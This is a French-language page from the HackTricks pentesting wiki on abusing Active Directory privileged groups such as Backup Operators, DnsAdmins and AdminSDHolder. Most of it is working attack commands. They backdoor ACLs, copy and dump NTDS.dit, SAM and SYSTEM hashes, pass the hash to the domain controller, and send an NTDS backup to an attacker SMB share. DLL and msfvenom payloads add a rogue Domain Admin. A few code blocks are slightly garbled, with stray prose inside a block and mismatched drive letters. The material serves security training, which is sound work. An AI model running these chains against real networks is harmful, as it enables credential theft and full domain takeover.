# Groupes privilégiés

{{#include ../../banners/hacktricks-training.md}}

## Groupes bien connus disposant de privilèges d'administration

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Ce groupe est habilité à créer des comptes et des groupes qui ne sont pas administrateurs sur le domaine. De plus, il permet la connexion locale au contrôleur de domaine (DC).

Pour identifier les membres de ce groupe, la commande suivante est exécutée :
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
L'ajout de nouveaux utilisateurs est autorisé, ainsi que la connexion locale au DC.

## Groupe **AdminSDHolder**

La Access Control List (ACL) du groupe **AdminSDHolder** est cruciale car elle définit les permissions pour tous les groupes protégés au sein d'Active Directory, y compris les groupes à privilèges élevés. Ce mécanisme garantit la sécurité de ces groupes en empêchant les modifications non autorisées.

Un attaquant pourrait exploiter cela en modifiant l'ACL du groupe **AdminSDHolder**, en accordant des permissions complètes à un utilisateur standard. Cela donnerait effectivement à cet utilisateur le contrôle total sur tous les groupes protégés. Si les permissions de cet utilisateur sont modifiées ou supprimées, elles seraient automatiquement rétablies dans l'heure en raison du fonctionnement du système.

Les commandes pour examiner les membres et modifier les permissions incluent :
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Un script est disponible pour accélérer le processus de restauration : [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Pour plus de détails, consultez [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

L'appartenance à ce groupe permet la lecture des objets Active Directory supprimés, ce qui peut révéler des informations sensibles :
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Accès au contrôleur de domaine

L'accès aux fichiers sur le DC est restreint sauf si l'utilisateur fait partie du groupe `Server Operators`, ce qui modifie le niveau d'accès.

### Escalade de privilèges

En utilisant `PsService` ou `sc` de Sysinternals, on peut inspecter et modifier les permissions des services. Le groupe `Server Operators`, par exemple, dispose d'un contrôle total sur certains services, permettant l'exécution de commandes arbitraires et l'escalade de privilèges :
```cmd
C:\> .\PsService.exe security AppReadiness
```
Cette commande révèle que `Server Operators` disposent d'un accès complet, permettant la manipulation des services pour obtenir des privilèges élevés.

## Backup Operators

L'appartenance au groupe `Backup Operators` donne accès au système de fichiers `DC01` grâce aux privilèges `SeBackup` et `SeRestore`. Ces privilèges permettent la traversée de dossiers, l'énumération et la copie de fichiers, même sans permissions explicites, en utilisant le flag `FILE_FLAG_BACKUP_SEMANTICS`. L'utilisation de scripts spécifiques est nécessaire pour ce processus.

Pour lister les membres du groupe, exécutez :
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Attaque locale

Pour exploiter ces privilèges localement, les étapes suivantes sont employées :

1. Importer les bibliothèques nécessaires :
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Activer et vérifier `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Accéder et copier des fichiers depuis des répertoires restreints, par exemple :
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Attaque AD

L'accès direct au système de fichiers du contrôleur de domaine permet le vol de la base de données `NTDS.dit`, qui contient tous les hashs NTLM des utilisateurs et ordinateurs du domaine.

#### Utilisation de diskshadow.exe

1. Créer une shadow copy du lecteur `C` :
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Copier `NTDS.dit` depuis la shadow copy :
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativement, utilisez `robocopy` pour la copie de fichiers :
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Extraire `SYSTEM` et `SAM` pour récupérer les hash:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Récupérer tous les hashes de `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Après extraction : Pass-the-Hash vers DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Utilisation de wbadmin.exe

1. Configurez un système de fichiers NTFS pour le serveur SMB sur la machine attaquante et mettez en cache les identifiants SMB sur la machine cible.
2. Utilisez `wbadmin.exe` pour la sauvegarde système et l'extraction de `NTDS.dit` :
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Pour une démonstration pratique, voir [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Les membres du groupe **DnsAdmins** peuvent exploiter leurs privilèges pour charger une DLL arbitraire avec les privilèges SYSTEM sur un serveur DNS, souvent hébergé sur des Domain Controllers. Cette capacité offre un fort potentiel d'exploitation.

Pour lister les membres du groupe DnsAdmins, utilisez :
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Exécuter une DLL arbitraire (CVE‑2021‑40469)

> [!NOTE]
> Cette vulnérabilité permet l'exécution de code arbitraire avec les privilèges SYSTEM dans le service DNS (généralement à l'intérieur des DCs). Ce problème a été corrigé en 2021.

Les membres peuvent forcer le serveur DNS à charger une DLL arbitraire (soit localement, soit depuis un partage distant) en utilisant des commandes telles que:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Redémarrer le service DNS (ce qui peut nécessiter des autorisations supplémentaires) est nécessaire pour que la DLL soit chargée :
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Pour plus de détails sur ce vecteur d'attaque, consultez ired.team.

#### Mimilib.dll

Il est également possible d'utiliser mimilib.dll pour l'exécution de commandes, en le modifiant pour exécuter des commandes spécifiques ou des reverse shells. [Consultez cet article](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) pour plus d'informations.

### Enregistrement WPAD pour MitM

Les membres de DnsAdmins peuvent manipuler les enregistrements DNS pour réaliser des attaques Man-in-the-Middle (MitM) en créant un enregistrement WPAD après avoir désactivé la liste globale de blocage des requêtes. Des outils comme Responder ou Inveigh peuvent être utilisés pour le spoofing et la capture du trafic réseau.

### Event Log Readers
Les membres peuvent accéder aux journaux d'événements, trouvant potentiellement des informations sensibles telles que des mots de passe en clair ou des détails d'exécution de commandes :
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Autorisations Exchange Windows

Ce groupe peut modifier les DACLs sur l'objet de domaine, accordant potentiellement les privilèges DCSync. Les techniques d'escalade de privilèges exploitant ce groupe sont détaillées dans le repo GitHub Exchange-AD-Privesc.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Administrators

Hyper-V Administrators ont un accès complet à Hyper-V, ce qui peut être exploité pour prendre le contrôle de Domain Controllers virtualisés. Cela inclut le clonage de contrôleurs de domaine (DC) actifs et l'extraction des hashes NTLM du fichier NTDS.dit.

### Exploitation Example

Le Mozilla Maintenance Service de Firefox peut être exploité par les Hyper-V Administrators pour exécuter des commandes en tant que SYSTEM. Cela implique de créer un hard link vers un fichier SYSTEM protégé et de le remplacer par un exécutable malveillant :
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Remarque : Hard link exploitation a été atténuée dans les récentes mises à jour de Windows.

## Group Policy Creators Owners

Ce groupe permet à ses membres de créer des Group Policies dans le domaine. Cependant, ses membres ne peuvent pas appliquer de Group Policies aux utilisateurs ou aux groupes, ni modifier les GPOs existants.

## Organization Management

Dans les environnements où Microsoft Exchange est déployé, un groupe spécial appelé Organization Management dispose de capacités importantes. Ce groupe a le privilège d'accéder aux boîtes aux lettres de tous les utilisateurs du domaine et possède le contrôle total sur l'Organizational Unit (OU) 'Microsoft Exchange Security Groups'. Ce contrôle inclut le groupe Exchange Windows Permissions, qui peut être exploité pour privilege escalation.

### Exploitation des privilèges et commandes

#### Print Operators

Les membres du groupe Print Operators disposent de plusieurs privilèges, y compris le SeLoadDriverPrivilege, qui leur permet de se connecter localement à un Domain Controller, de l'arrêter et de gérer les imprimantes. Pour exploiter ces privilèges, en particulier si SeLoadDriverPrivilege n'est pas visible dans un contexte non élevé, il est nécessaire de contourner User Account Control (UAC).

Pour lister les membres de ce groupe, utilisez la commande PowerShell suivante :
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Pour des techniques d'exploitation plus détaillées liées à **`SeLoadDriverPrivilege`**, consultez des ressources de sécurité spécialisées.

#### Utilisateurs du Bureau à distance

Les membres de ce groupe se voient accorder l'accès aux PC via le protocole Remote Desktop (RDP). Pour énumérer ces membres, des commandes PowerShell sont disponibles :
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Des informations complémentaires sur l'exploitation de RDP se trouvent dans des ressources dédiées au pentesting.

#### Utilisateurs de gestion à distance

Les membres peuvent accéder aux PC via **Windows Remote Management (WinRM)**. L'énumération de ces membres peut s'effectuer via :
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Pour les techniques d'exploitation liées à **WinRM**, une documentation spécifique doit être consultée.

#### Opérateurs de serveurs

Ce groupe a les permissions pour effectuer diverses configurations sur les contrôleurs de domaine, y compris les privilèges de sauvegarde et de restauration, la modification de l'heure système et l'arrêt du système. Pour énumérer les membres, la commande fournie est :
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Références <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
